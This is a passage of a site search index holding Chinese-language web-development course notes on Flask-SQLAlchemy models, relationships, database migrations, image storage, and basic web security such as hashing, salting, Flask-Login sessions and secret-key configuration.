(\u662f\u5426\u662f\u5916\u952e), <code>unique</code> (\u503c\u662f\u5426\u552f\u4e00), <code>index</code> (\u662f\u5426\u521b\u5efa\u7d22\u5f15) \u7b49\u3002</li> </ul> </li> <li>Example Model Definition\uff1a     <pre><code>from app import db\n\nclass Student(db.Model):\n    student_id = db.Column(db.Integer, primary_key=True) # \u6574\u578b\u4e3b\u952e\n    student_name = db.Column(db.String(50), nullable=False) # \u5b57\u7b26\u4e32\u7c7b\u578b\uff0c\u6700\u5927\u957f\u5ea650\uff0c\u4e0d\u5141\u8bb8\u4e3a\u7a7a\n    group_id = db.Column(db.Integer, db.ForeignKey('group.group_id')) # \u6574\u578b\u5916\u952e\uff0c\u5f15\u7528 group \u8868\u7684 group_id\n    # relationship \u5b9a\u4e49\u5728\u6b64\u5904\u6216 Group \u6a21\u578b\u4e2d\n</code></pre> <pre><code>class Group(db.Model):\n    group_id = db.Column(db.Integer, primary_key=True) # \u6574\u578b\u4e3b\u952e\n    group_name = db.Column(db.String(50)) # \u5b57\u7b26\u4e32\u7c7b\u578b\n    # relationship \u5b9a\u4e49\u5728\u6b64\u5904\u6216 Student \u6a21\u578b\u4e2d\n</code></pre></li> <li>Flask-SQLAlchemy \u53ef\u4ee5\u4ece Model \u4e2d\u81ea\u52a8\u63d0\u53d6\u6570\u636e\u5e93\u8868\u7684 schema\u3002Model \u7c7b\u5b9a\u4e49\u4e86\u6570\u636e\u5e93\u7684 schema\u3002</li> </ul>"},{"location":"cs/mern/3403/l11/#6-purpose-of-sqlalchemy-relationships","title":"6. Purpose of SQLAlchemy relationships","text":"<ul> <li>Purpose\uff1aForeign key \u5141\u8bb8\u8bbf\u95ee\u94fe\u63a5\u5bf9\u8c61\u7684 ID\uff0c\u4f46\u9700\u8981\u8fd0\u884c\u5355\u72ec\u7684\u67e5\u8be2\u6765\u67e5\u627e\u5bf9\u8c61\u3002\u4f7f\u7528 <code>db.relationship</code> \u53ef\u4ee5\u76f4\u63a5\u5c06\u94fe\u63a5\u5bf9\u8c61\u4f5c\u4e3a\u7c7b\u7684\u5b57\u6bb5\u8bbf\u95ee\u3002\u8fd9\u4f7f\u5f97\u8bbf\u95ee\u94fe\u63a5\u5bf9\u8c61\u66f4\u52a0\u76f4\u89c2\u548c\u201cPythonic\u201d\u3002</li> <li>Usage\uff1a\u5728 Model \u4e2d\u4f7f\u7528 <code>db.relationship</code> \u5b9a\u4e49\u5173\u7cfb\u3002</li> <li>Access\uff1a\u5b9a\u4e49\u5173\u7cfb\u540e\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u548c\u5206\u914d\u94fe\u63a5\u5bf9\u8c61\uff0c\u5c31\u50cf\u8bbf\u95ee\u666e\u901a\u53d8\u91cf\u4e00\u6837\u3002\u4f8b\u5982\uff0c\u5982\u679c Student Model \u4e0e Group Model \u6709\u5173\u7cfb\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>student_instance.group</code> \u76f4\u63a5\u83b7\u53d6\u5173\u8054\u7684 Group \u5bf9\u8c61\u3002</li> <li>Back-populates\uff1a<code>back-populates</code> \u53c2\u6570\u94fe\u63a5\u53cc\u5411\u5173\u7cfb\u3002\u5982\u679c\u66f4\u65b0 <code>group.students</code>\uff0c\u90a3\u4e48\u6bcf\u4e2a\u76f8\u5173 <code>student.group</code> \u5b57\u6bb5\u4e5f\u4f1a\u66f4\u65b0\u3002\u8fd9\u786e\u4fdd\u4e86\u6240\u6709\u5173\u8054\u5bf9\u8c61\u540c\u65f6\u66f4\u65b0\u3002</li> <li>Types\uff1a\u4f7f\u7528 <code>db.relationship</code> \u65b9\u6cd5\u53ef\u4ee5\u521b\u5efa\u4e00\u5bf9\u4e00 (one-to-one)\u3001\u4e00\u5bf9\u591a (one-to-many) \u548c\u591a\u5bf9\u591a (many-to-many) \u5173\u7cfb\u3002</li> <li>Example Relationship Definition\uff1a     <pre><code>from app import db\n\nclass Student(db.Model):\n    # ... \u5176\u4ed6\u5217\u5b9a\u4e49 ...\n    group_id = db.Column(db.Integer, db.ForeignKey('group.group_id'))\n    group = db.relationship('Group', back_populates='students') # \u5b9a\u4e49\u4e0e Group \u6a21\u578b\u7684\u5173\u7cfb\uff0cback-populates \u5230 Group \u6a21\u578b\u7684 'students' \u5b57\u6bb5\n</code></pre> <pre><code>class Group(db.Model):\n    # ... \u5176\u4ed6\u5217\u5b9a\u4e49 ...\n    students = db.relationship('Student', back_populates='group') # \u5b9a\u4e49\u4e0e Student \u6a21\u578b\u7684\u5173\u7cfb\uff0cback-populates \u5230 Student \u6a21\u578b\u7684 'group' \u5b57\u6bb5\n</code></pre></li> </ul>"},{"location":"cs/mern/3403/l11/#7-purpose-and-high-level-overview-of-how-database-migrations-work","title":"7. Purpose and high-level overview of how Database migrations work","text":"<ul> <li>Purpose\uff1a\u6570\u636e\u5e93\u8fc1\u79fb (Database migration) \u662f\u5fc5\u8981\u7684\uff0c\u56e0\u4e3a\u5728\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u8fc7\u7a0b\u4e2d\uff0cModel \u4f1a\u9891\u7e41\u53d8\u66f4\u3002\u5b83\u5141\u8bb8\u5728\u4e0d\u7834\u574f\u73b0\u6709\u6570\u636e\u7684\u60c5\u51b5\u4e0b\u66f4\u65b0\u6570\u636e\u5e93 schema\u3002\u5b83\u5c31\u50cf\u6570\u636e\u5e93\u7684\u7248\u672c\u63a7\u5236\uff0c\u5141\u8bb8\u5728\u4e0d\u540c\u7248\u672c\u4e4b\u95f4\u524d\u8fdb\u6216\u56de\u9000\u3002\u8fd9\u5bf9\u4e8e\u62e5\u6709\u5927\u91cf\u7528\u6237\u6216\u6709\u4ef7\u503c\u6570\u636e\u7684\u5927\u578b\u5e94\u7528\u7a0b\u5e8f\u81f3\u5173\u91cd\u8981\u3002</li> <li>How it works (High-level)\uff1a<ul> <li>\u6bcf\u4e2a\u6570\u636e\u5e93\u66f4\u6539\u90fd\u9644\u5e26\u5347\u7ea7 (upgrade) \u548c\u964d\u7ea7 (downgrade) \u811a\u672c\u3002\u8fd9\u4e9b\u811a\u672c\u7528\u4e8e\u5c06\u6570\u636e\u5e93\u4ece\u4e00\u4e2a\u7248\u672c\u79fb\u52a8\u5230 Model \u7684\u524d\u4e00\u4e2a\u7248\u672c\u3002</li> <li>SQLAlchemy \u4f7f\u7528 Alembic \u8fc1\u79fb\u6846\u67b6\uff0c\u7531 <code>flask-migrate</code> \u5305\u5305\u88c5\u3002</li> <li>Initialization\uff1a\u8fd0\u884c <code>flask db init</code> \u547d\u4ee4\u521d\u59cb\u5316\u6570\u636e\u5e93\u5e76\u521b\u5efa\u8fc1\u79fb\u6587\u4ef6\u5939\u3002</li> <li>Creating Migrations\uff1a<ul> <li><code>flask db revision</code>\uff1a\u624b\u52a8\u521b\u5efa\u8fc1\u79fb\u811a\u672c\u3002</li> <li><code>flask db migrate</code>\uff1a\u81ea\u52a8\u521b\u5efa\u8fc1\u79fb\u811a\u672c\u3002\u5b83\u5c06\u66f4\u65b0\u7684 Model \u7c7b\u4e0e\u6570\u636e\u5e93\u7684\u5f53\u524d\u72b6\u6001\u8fdb\u884c\u6bd4\u8f83\u3002\u751f\u6210\u7684\u811a\u672c\u5305\u542b <code>upgrade()</code> \u548c <code>downgrade()</code> \u65b9\u6cd5\u3002</li> </ul> </li> <li>Applying Migrations\uff1a <code>flask db upgrade</code> \u5e94\u7528\u811a\u672c\u4f7f\u6570\u636e\u5e93\u4e0e Model \u540c\u6b65\u3002</li> <li>Rolling Back\uff1a <code>flask db downgrade</code> \u56de\u6eda\u66f4\u6539\u5230\u4e0a\u4e00\u4e2a\u7248\u672c\u3002</li> </ul> </li> <li>Importance\uff1a\u786e\u4fdd\u6570\u636e\u5e93 schema \u548c Model \u4fdd\u6301\u540c\u6b65\u3002\u5728\u9879\u76ee\u7ec4\u4e2d\uff0c\u9700\u8981\u6267\u884c\u81f3\u5c11\u4e24\u6b21\u6570\u636e\u5e93\u8fc1\u79fb\u624d\u80fd\u83b7\u5f97\u6700\u9ad8\u5206\u3002</li> <li>Version Control\uff1a\u8fc1\u79fb\u811a\u672c\u5e94\u8be5\u4e0a\u4f20\u5230 Git \u4ed3\u5e93\u3002\u5b83\u4eec\u8ddf\u8e2a schema \u7684\u53d8\u5316\uff0c\u5e2e\u52a9\u56e2\u961f\u6210\u5458\u540c\u6b65\u3002\u6570\u636e\u5e93\u6587\u4ef6\u672c\u8eab (<code>app.db</code>) \u4e0d\u5e94\u63d0\u4ea4\u5230 Git \u4ed3\u5e93\u3002</li> </ul>"},{"location":"cs/mern/3403/l11/#8-best-practice-for-storing-images","title":"8. Best practice for storing images","text":"<ul> <li>Direct Storage\uff1a\u53ef\u4ee5\u4f7f\u7528 Blob \u5217\u7c7b\u578b\u5c06\u56fe\u50cf\u76f4\u63a5\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u3002\u4f46\u8fd9\u6027\u80fd\u5f88\u5dee\uff0c\u56e0\u4e3a\u6570\u636e\u5e93\u5e76\u975e\u8bbe\u8ba1\u7528\u4e8e\u5b58\u50a8\u6b64\u7c7b\u6570\u636e\u3002</li> <li>Small-scale Projects\uff1a\u5c06\u56fe\u50cf\u5b58\u50a8\u5728\u670d\u52a1\u5668\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff0c\u5e76\u5728\u6570\u636e\u5e93\u4e2d\u5b58\u50a8\u6307\u5411\u8be5\u6587\u4ef6\u7684\u8def\u5f84 (path)\u3002\u8fd9\u662f\u4e00\u79cd\u66f4\u597d\u7684\u65b9\u6cd5\u3002</li> <li>Large-scale Projects\uff1a\u6700\u597d\u5c06\u56fe\u50cf\u5b58\u50a8\u5728\u670d\u52a1\u5668\u4e4b\u5916\u7684\u4e13\u7528\u786c\u4ef6\u4e0a\u3002\u8fd9\u4e9b\u786c\u4ef6\u9488\u5bf9\u91cd\u5ea6 IO \u64cd\u4f5c\u8fdb\u884c\u4e86\u4f18\u5316\uff0c\u800c\u670d\u52a1\u5668\u786c\u4ef6\u5e76\u672a\u4f18\u5316\u3002\u4f8b\u5982\uff0c\u5c06\u56fe\u50cf\u5b58\u50a8\u5728 Amazon bucket \u7b49\u5916\u90e8\u670d\u52a1\u4e0a\u3002</li> </ul>"},{"location":"cs/mern/3403/l11/#9-considerations-when-building-a-real-life-webserver","title":"9. Considerations when building a real-life webserver","text":"<ul> <li>\u5f53\u5e94\u7528\u7a0b\u5e8f\u8fbe\u5230\u4e00\u5b9a\u89c4\u6a21\u65f6\uff0c\u6570\u636e\u5e93\u5fc5\u987b\u652f\u6301\u66f4\u591a\u529f\u80fd\u3002</li> <li>Indexing\uff1a\u4e3a\u9891\u7e41\u4f7f\u7528\u7684\u6570\u636e\u6dfb\u52a0\u7d22\u5f15 (indexes)\uff0c\u4ee5\u63d0\u9ad8\u67e5\u8be2\u6027\u80fd\u3002</li> <li>Data Layout Optimisation\uff1a\u6839\u636e\u6570\u636e\u662f\u7ecf\u5e38\u8bfb\u53d6\u8fd8\u662f\u5199\u5165\u6765\u4f18\u5316\u6570\u636e\u5e03\u5c40\u3002</li> <li>Caching\uff1a\u7f13\u5b58\u7ed3\u679c\u4ee5\u907f\u514d\u91cd\u590d\u6267\u884c\u76f8\u540c\u7684\u67e5\u8be2\u3002\u5bf9\u4e8e\u591a\u4e2a\u7528\u6237\u9891\u7e41\u8bf7\u6c42\u76f8\u540c\u6216\u6700\u65b0\u6570\u636e\u65f6\u5c24\u5176\u6709\u7528\u3002</li> <li>Security\uff1a\u6570\u636e\u5e93\u5b89\u5168\u6027\u81f3\u5173\u91cd\u8981\u3002\u5373\u4f7f\u670d\u52a1\u5668\u88ab\u653b\u7834\uff0c\u4e5f\u8981\u963b\u6b62\u6076\u610f\u7528\u6237\u6216\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u6570\u636e\u5e93\u3002\u9700\u8981\u5728\u670d\u52a1\u5668\u4e0a\u5b9e\u65bd\u5b89\u5168\u673a\u5236\u3002</li> <li>Backups\uff1a\u6267\u884c\u5907\u4efd\u4ee5\u907f\u514d\u670d\u52a1\u5668\u6545\u969c\u65f6\u4e22\u5931\u6570\u636e\u5e93\u3002\u5bf9\u4e8e\u5927\u578b\u9879\u76ee\u975e\u5e38\u91cd\u8981\u3002</li> <li>Auditing\uff1a\u5ba1\u8ba1 (auditing) \u4ee5\u8ddf\u8e2a\u6570\u636e\u5e93\u4f55\u65f6\u88ab\u8c01\u66f4\u6539\u3002\u8fd9\u5bf9\u4e8e\u7ba1\u7406\u6570\u636e\u7684\u201c\u9ec4\u91d1\u526f\u672c\u201d\u548c\u4e86\u89e3\u8c01\u8fdb\u884c\u4e86\u54ea\u4e9b\u66f4\u6539\u975e\u5e38\u91cd\u8981\u3002</li> </ul>"},{"location":"cs/mern/3403/l12/","title":"12.0 Security","text":""},{"location":"cs/mern/3403/l12/#security-basics","title":"Security Basics","text":"<p>\u5f00\u53d1 Web \u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u5b89\u5168\u6027\u662f\u4e00\u4e2a\u9996\u8981\u5173\u6ce8\u70b9\u3002\u6838\u5fc3\u5047\u8bbe\u662f\u7f51\u7edc\u672c\u8eab\u662f\u4e0d\u53ef\u4fe1\u7684\u3002\u5fc5\u987b\u63a7\u5236\u6570\u636e\u8bbf\u95ee\uff0c\u5b89\u5168\u5730\u9a8c\u8bc1\u5bc6\u7801\uff0c\u5e76\u4e14\u7528\u6237\u5fc5\u987b\u80fd\u591f\u4fe1\u4efb\u5448\u73b0\u7ed9\u4ed6\u4eec\u7684\u4fe1\u606f\u3002\u5b8c\u5168\u7684\u5b89\u5168\u6027\u975e\u5e38\u96be\u4ee5\u5b9e\u73b0\uff0c\u8d85\u51fa\u4e86\u672c\u8bfe\u7a0b\u7684\u8303\u56f4\u3002</p> <p>Web \u5b89\u5168\u4f9d\u8d56\u4e8e\u4fe1\u4efb\u3002\u4e3b\u8981\u5305\u542b\u51e0\u4e2a\u8981\u7d20\uff1a 1.  Web \u670d\u52a1\u5668\u9700\u8981\u786e\u4fe1\u8bbf\u95ee\u6570\u636e\u7684\u4eba\u5df2\u6388\u6743\u3002\u8fd9\u901a\u8fc7\u4f1a\u8bdd/\u57fa\u4e8e\u4ee4\u724c\u7684\u8eab\u4efd\u9a8c\u8bc1\u6765\u5b9e\u73b0\u3002 2.  \u7528\u6237\u9700\u8981\u77e5\u9053\u4ed6\u4eec\u8bbf\u95ee\u7684\u7f51\u7ad9\u662f\u4ed6\u4eec\u60f3\u8981\u7684\u7f51\u7ad9\u3002\u8fd9\u901a\u8fc7 SSL Certificates \u6765\u5b9e\u73b0\u3002 3.  \u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u90fd\u9700\u8981\u786e\u4fe1\u4e2d\u95f4\u6ca1\u6709\u4eba\u672a\u7ecf\u6388\u6743\u8bbf\u95ee\u6570\u636e\u3002\u8fd9\u901a\u8fc7 HTTPS (HTTP Secure) \u6765\u5b9e\u73b0\u3002</p> <p>\u8fd9\u4e9b\u6280\u672f\u7684\u57fa\u7840\u662fPublic-Key Encryption\uff08\u516c\u94a5\u52a0\u5bc6\uff09\u548c Cryptographic Hashing\uff08\u5bc6\u7801\u6563\u5217\uff09\u3002</p>"},{"location":"cs/mern/3403/l12/#public-key-encryption","title":"Public Key Encryption","text":"<p>Secure communication \u57fa\u4e8e Public Key Encryption\u3002\u5b83\u6d89\u53ca\u4e00\u5bf9\u5bc6\u94a5\uff1apub\uff08\u516c\u94a5\uff09\u548c priv\uff08\u79c1\u94a5\uff09\u3002\u516c\u94a5\u53ef\u4ee5\u53d1\u5e03\uff0c\u4f46\u5373\u4f7f\u77e5\u9053\u516c\u94a5\u4e5f\u65e0\u6cd5\u8ba1\u7b97\u51fa\u79c1\u94a5\u3002\u52a0\u5bc6\u51fd\u6570 Ek(\u2022) \u4f7f\u7528\u5bc6\u94a5 k \u8fdb\u884c\u52a0\u5bc6\uff0c\u89e3\u5bc6\u51fd\u6570 Dk(\u2022) \u4f7f\u7528\u5bc6\u94a5 k \u8fdb\u884c\u89e3\u5bc6\u3002\u5bf9\u4e8e\u4e00\u5bf9\u516c\u79c1\u94a5\uff0c\u6ee1\u8db3 x = Dpriv(Epub(x)) \u548c x = Dpub(Epriv(x))\u3002</p> <p>Public Key Encryption \u7684\u7528\u9014\u5305\u62ec\uff1a *   Authentication\uff08\u8eab\u4efd\u9a8c\u8bc1\uff09\uff1aEpub(x) \u7684\u503c\u53ef\u4ee5\u53d1\u5e03\uff0c\u53ea\u6709\u77e5\u9053 priv \u7684\u4eba\u901a\u8fc7\u8ba1\u7b97 Dpriv(Epub(x)) \u624d\u80fd\u5f97\u51fa x\u3002 *   Digital Signatures\uff08\u6570\u5b57\u7b7e\u540d\uff09\uff1a\u4e00\u5bf9 (x, Epriv(x)) \u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97 Dpub(Epriv(x)) \u5e76\u4e0e x \u6bd4\u8f83\u6765\u9a8c\u8bc1\uff0c\u4f46\u53ea\u6709\u77e5\u9053 priv \u7684\u4eba\u624d\u80fd\u521b\u5efa\u3002 *   Key Distribution\uff08\u5bc6\u94a5\u5206\u53d1\uff09\uff1a\u53ef\u4ee5\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u968f\u673a\u5bc6\u94a5 x\uff0c\u7136\u540e Epub(x) \u53ef\u4ee5\u53d1\u9001\u7ed9\u77e5\u9053 priv \u7684\u4eba\u3002\u8fd9\u6837\u53ea\u6709\u8fd9\u5bf9\u53cc\u65b9\u77e5\u9053 x\u3002</p>"},{"location":"cs/mern/3403/l12/#cryptographic-hashing","title":"Cryptographic Hashing","text":"<p>Secure data storage \u57fa\u4e8e Cryptographic Hashing\u3002\u5bc6\u7801\u6563\u5217\u51fd\u6570 hash \u63a5\u53d7\u4efb\u610f\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u4e00\u4e2a\u56fa\u5b9a\u957f\u5ea6\u7684\u6574\u6570\u3002\u5176\u5173\u952e\u5c5e\u6027\u5305\u62ec\uff1a *   \u7ed9\u5b9a\u4e00\u4e2a\u503c h\uff0c\u5f88\u96be\u627e\u5230\u4e00\u4e2a x \u4f7f\u5f97 hash(x) = h\u3002 *   \u7ed9\u5b9a\u4e00\u4e2a\u503c x\uff0c\u5f88\u96be\u627e\u5230\u4e00\u4e2a y \u4f7f\u5f97 hash(x) = hash(y)\u3002</p> <p>\u672c\u8d28\u4e0a\uff0c\u5b83\u4ece\u6570\u636e\u6d41\u8ba1\u7b97\u51fa\u4e00\u4e2a\u6570\u5b57\uff0c\u4f7f\u5f97\u4f2a\u9020\u5177\u6709\u7279\u5b9a\u6563\u5217\u503c\u7684\u6570\u636e\u975e\u5e38\u56f0\u96be\u3002\u8fd9\u4e0e\u7528\u4e8e\u6563\u5217\u8868\u7684\u6563\u5217\u4e0d\u540c\uff0c\u5bc6\u7801\u6563\u5217\u5fc5\u987b\u6ee1\u8db3\u66f4\u5f3a\u7684\u5c5e\u6027\u3002</p> <p>\u5b83\u53ef\u7528\u4e8e\uff1a *   Storing Passwords Securely\uff08\u5b89\u5168\u5b58\u50a8\u5bc6\u7801\uff09\uff1a\u7ed9\u5b9a\u5bc6\u7801 p\uff0c\u53ef\u4ee5\u5728\u6570\u636e\u5e93\u4e2d\u5b58\u50a8 h = hash(p) \u800c\u4e0d\u662f p\u3002\u5f53\u7528\u6237\u4f7f\u7528\u5bc6\u7801 q \u5c1d\u8bd5\u767b\u5f55\u65f6\uff0c\u53ef\u4ee5\u6d4b\u8bd5 hash(q) = h \u662f\u5426\u6210\u7acb\u3002</p> <p>Best practices for hashing\uff1a\u5bc6\u7801\u6563\u5217\u51fd\u6570\u7684\u8bbe\u8ba1\u975e\u5e38\u56f0\u96be\u3002\u5207\u52ff\u5c1d\u8bd5\u521b\u5efa\u81ea\u5df1\u7684\u6563\u5217\u51fd\u6570\u6216\u6df7\u7528\u4e0d\u540c\u7684\u6563\u5217\u51fd\u6570\u3002</p>"},{"location":"cs/mern/3403/l12/#session-based-user-authentication","title":"Session-Based User Authentication","text":"<p>\u867d\u7136 HTTP \u662f\u65e0\u72b6\u6001\u7684\uff0c\u4f46\u5e94\u7528\u7a0b\u5e8f\u4e0d\u662f\u3002\u4e3a\u4e86\u8ddf\u8e2a\u7528\u6237\u7684 session\uff0c\u9700\u8981\u7528\u6237\u6ce8\u518c\uff0c\u4ee5\u4fbf\u5c06\u7528\u6237\u540d\u548c\u5bc6\u7801\u4e0e\u4ed6\u4eec\u5173\u8054\u3002\u5bc6\u7801\u88ab\u52a0\u76d0\uff08salted\uff09\u548c\u6563\u5217\uff08hashed\uff09\uff0c\u7ed3\u679c\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u3002\u7528\u6237\u767b\u5f55\u65f6\u63d0\u4f9b\u76f8\u540c\u7684\u5bc6\u7801\uff0c\u518d\u6b21\u52a0\u76d0\u548c\u6563\u5217\u751f\u6210\u4e00\u4e2a\u6458\u8981\uff0c\u4e0e\u6570\u636e\u5e93\u4e2d\u7684\u6563\u5217\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u6210\u529f\uff0c\u670d\u52a1\u5668\u54cd\u5e94\u4f1a\u5305\u542b\u4e00\u4e2a\u5e26\u6709 session ID \u548c hash(ID + secret) \u7684 cookie\u3002\u968f\u540e\u7684 HTTP \u8bf7\u6c42\u4e2d\uff0c\u670d\u52a1\u5668\u4f1a\u68c0\u67e5 cookie \u4e2d\u7684 session ID \u5e76\u91cd\u65b0\u8ba1\u7b97\u3002</p> <p>Flask \u901a\u8fc7\u4e00\u4e2a \"secret key\" \u6765\u5b9e\u73b0 session \u7684\u6982\u5ff5\u3002\u5f53 Flask \u914d\u7f6e\u4e86 secret key\uff0c\u5b83\u4f1a\u81ea\u52a8\u5305\u542b\u4e00\u4e2a\u7b7e\u540d\u7684 cookie\u3002\u5c06 secret key \u5b58\u50a8\u5728\u6e90\u6587\u4ef6\u4e2d\u662f\u4e2a\u574f\u4e3b\u610f\uff0c\u56e0\u4e3a\u5b83\u4f1a\u88ab\u63a8\u9001\u5230 Git \u4ed3\u5e93\u3002\u66f4\u597d\u7684\u505a\u6cd5\u662f\u901a\u8fc7\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e secret key\uff0c\u5e76\u5728\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u65f6\u52a0\u8f7d\u3002</p> <p>Flask-Login \u5305\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4f7f\u7528\u73b0\u6709 session \u57fa\u7840\u8bbe\u65bd\u5b9e\u73b0\u767b\u5f55\u7684\u63a5\u53e3\u3002\u5b89\u88c5\u540e\uff0c\u9700\u8981\u5728 <code>__init__.py</code> \u4e2d\u521b\u5efa LoginManager \u5b9e\u4f8b\u3002\u9700\u8981\u8bbe\u7f6e <code>login_view</code> \u6307\u5411\u767b\u5f55\u9875\u9762\u7684\u8def\u7531\u540d\u79f0\u3002Flask-Login \u9700\u8981\u77e5\u9053\u5982\u4f55\u52a0\u8f7d\u201cuser\u201d\u5bf9\u8c61\u3002 <code>@login.user_loader</code> \u88c5\u9970\u5668\u7528\u4e8e\u6807\u8bb0\u5c06 ID \u6620\u5c04\u5230\u7528\u6237\u7684\u51fd\u6570\uff0c\u901a\u5e38\u5728 <code>models.py</code> \u4e2d\u3002</p> <p>User model \u9700\u8981\u5b9e\u73b0\u51e0\u4e2a\u65b9\u6cd5\u548c\u5c5e\u6027\u4f9b Flask-Login \u4f7f\u7528: *   <code>is_authenticated</code>\uff1a\u7528\u6237\u662f\u5426\u62e5\u6709\u6709\u6548\u7684\u767b\u5f55\u51ed\u636e\u3002 *   <code>is_active</code>\uff1a\u7528\u6237\u662f\u5426\u88ab\u5141\u8bb8\u767b\u5f55\u3002 *   <code>is_anonymous</code>\uff1a\u7528\u6237\u662f\u5426\u4e3a\u533f\u540d\u7528\u6237\u3002 *   <code>get_id()</code>\uff1a\u8fd4\u56de\u7528\u6237\u7684\u552f\u4e00 ID\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528 UserMixin \u6765\u5b9e\u73b0\u8fd9\u4e9b\u65b9\u6cd5\uff0c\u5b83\u63d0\u4f9b\u4e86\u5408\u7406\u7684\u9ed8\u8ba4\u503c\u3002</p> <p>Flask-Login \u63d0\u4f9b\u4e86\u5b9e\u7528\u7684\u5de5\u5177: *   <code>current_user</code>\uff1a\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u6a21\u578b\u3002\u5982\u679c\u672a\u767b\u5f55\uff0c\u5219\u8fd4\u56de\u7279\u6b8a\u7684\u533f\u540d\u7528\u6237\u5bf9\u8c61\u3002\u53ef\u4ee5\u5728\u89c6\u56fe\u51fd\u6570\u4e2d\u4f7f\u7528 <code>current_user.is_authenticated</code> \u6765\u68c0\u67e5\u7528\u6237\u662f\u5426\u767b\u5f55\u3002 *   <code>login_user()</code>\uff1a\u5c06 <code>current_user</code> \u8bbe\u7f6e\u4e3a\u6307\u5b9a\u7684\u7528\u6237\u6a21\u578b\u3002 *   <code>logout_user()</code>\uff1a\u5c06 <code>current_user</code> \u8bbe\u7f6e\u56de\u533f\u540d\u7528\u6237\u3002</p> <p><code>@login_required</code> \u88c5\u9970\u5668\u7528\u4e8e\u6807\u8bb0\u9700\u8981\u767b\u5f55\u7684\u8def\u7531\u3002\u672a\u767b\u5f55\u7528\u6237\u5c1d\u8bd5\u8bbf\u95ee\u6b64\u8def\u7531\u65f6\uff0c\u5c06\u81ea\u52a8\u6536\u5230\u672a\u7ecf\u6388\u6743\u7684\u54cd\u5e94\u3002<code>current_user</code> \u53d8\u91cf\u4e5f\u53ef\u4ee5\u5728 Jinja \u6a21\u677f\u4e2d\u4f7f\u7528\uff0c\u63a7\u5236\u9875\u9762\u5143\u7d20\u7684\u53ef\u89c1\u6027\u6216\u4e2a\u6027\u5316\u9875\u9762\u3002</p>"},{"location":"cs/mern/3403/l12/#salting-your-hashes","title":"Salting your hashes","text":"<p>\u4ec5\u5bf9\u5bc6\u7801\u8fdb\u884c\u6563\u5217\u4e0d\u8db3\u4ee5\u4fdd\u8bc1\u5b89\u5168\u3002\u5982\u679c\u653b\u51fb\u8005\u83b7\u53d6\u4e86\u6570\u636e\u5e93\uff0c\u4ed6\u4eec\u53ef\u4ee5\u901a\u8fc7\u5f69\u8679\u8868\uff08rainbow tables\uff09\u9884\u5148\u8ba1\u7b97\u5e38\u7528\u5bc6\u7801\u7684\u6563\u5217\u503c\u3002\u89e3\u51b3\u65b9\u6848\u662f\u4f7f\u7528\u968f\u673a\u7684 salt \u52a0\u76d0\u5bc6\u7801 <code>p</code>\uff0c\u5e76\u5728\u6570\u636e\u5e93\u4e2d\u5b58\u50a8 (s, hash(p + s))\uff0c\u800c\u4e0d\u662f hash(p)\u3002\u7531\u4e8e\u6bcf\u4e2a\u7528\u6237\u7684 salt \u4e0d\u540c\uff0c\u653b\u51fb\u8005\u65e0\u6cd5\u9884\u5148\u8ba1\u7b97\u5f69\u8679\u8868\u3002 werkzeug \u7684 <code>generate_password_hash</code> \u51fd\u6570\u4f1a\u81ea\u52a8\u5904\u7406\u52a0\u76d0\u3002</p> <p>Example (Conceptual): \u7528\u6237\u6ce8\u518c\u5bc6\u7801 \"password123\"\u3002 \u751f\u6210\u4e00\u4e2a\u968f\u673a salt\uff0c\u4f8b\u5982 \"xyz\"\u3002 \u5b58\u50a8 hash(\"password123\" + \"xyz\") \u548c \"xyz\" \u5728\u6570\u636e\u5e93\u3002 \u7528\u6237\u767b\u5f55\u8f93\u5165 \"password123\"\u3002 \u4ece\u6570\u636e\u5e93\u83b7\u53d6\u5b58\u50a8\u7684 salt \"xyz\"\u3002 \u8ba1\u7b97 hash(\"password123\" + \"xyz\")\u3002 \u5c06\u8ba1\u7b97\u51fa\u7684\u6563\u5217\u4e0e\u6570\u636e\u5e93\u4e2d\u5b58\u50a8\u7684\u6563\u5217\u8fdb\u884c\u6bd4\u8f83\u3002</p>"},{"location":"cs/mern/3403/l12/#configuring-secret-keys","title":"Configuring secret keys","text":"<p>Secret keys \u548c\u7b2c\u4e09\u65b9\u670d\u52a1\u7684\u51ed\u636e\u5e94\u8be5\u624b\u52a8\u914d\u7f6e\uff0c\u5e76\u4e14\u6c38\u8fdc\u4e0d\u8981\u5b58\u50a8\u5728 Git \u4ed3\u5e93\u7684\u7248\u672c\u63a7\u5236\u4e0b\u3002\u66f4\u597d\u7684\u65b9\u6cd5\u662f\u901a\u8fc7\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u5b83\u4eec\u3002\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u6765\u5b58\u50a8\u6240\u6709\u914d\u7f6e\u53d8\u91cf\uff0c\u5e76\u5728\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u65f6\u52a0\u8f7d\u3002</p> <p>Example: \u5728 Linux/macOS \u4e2d\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf: <code>export SECRET_KEY='this-is-a-very-secret-key'</code> \u5728 Flask \u914d\u7f6e\u4e2d\u8bfb\u53d6\u73af\u5883\u53d8\u91cf: <code>import os</code> <code>class Config:</code> <code>SECRET_KEY = os.environ.get('SECRET_KEY') or 'default-fallback-key'</code> 